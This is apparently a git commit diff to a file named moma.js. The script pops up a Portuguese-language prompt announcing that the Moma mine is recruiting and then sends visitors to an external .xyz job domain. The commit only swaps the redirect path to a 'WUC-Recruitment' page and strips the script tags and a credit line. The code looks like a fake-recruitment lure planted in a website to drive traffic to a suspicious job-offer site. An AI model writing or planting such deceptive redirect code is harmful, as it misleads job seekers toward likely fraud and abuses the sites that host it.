e28ce6ebc31059b027284005521a9c05101d9f87
newetijazz2 <newetijazz2@gmail.com>
2025-08-26 04:32:42 +0100

    Update moma.js

--- moma.js
+++ moma.js
@@ -1,9 +1,6 @@
-<script type="text/javascript"> 
-/* Password Protection Script by www.onlineofferz.xyz*/
+
 var password = 'Recrutamento da Mina Moma'
 password=prompt('AVISO: A Mina de Moma está neste momento a recrutar para vários cargos, clique em OK para se candidatar','Recrutamento da Mina Moma');
-if (password != 'Recrutamento da Mina Moma');
 if (password != 'Recrutamento da Mina Moma') {
-location.href='https://www.botswajobs.xyz/Moma-Mine-Recrutamento';
+location.href='https://www.botswajobs.xyz/WUC-Recruitment';
 }
-</script>
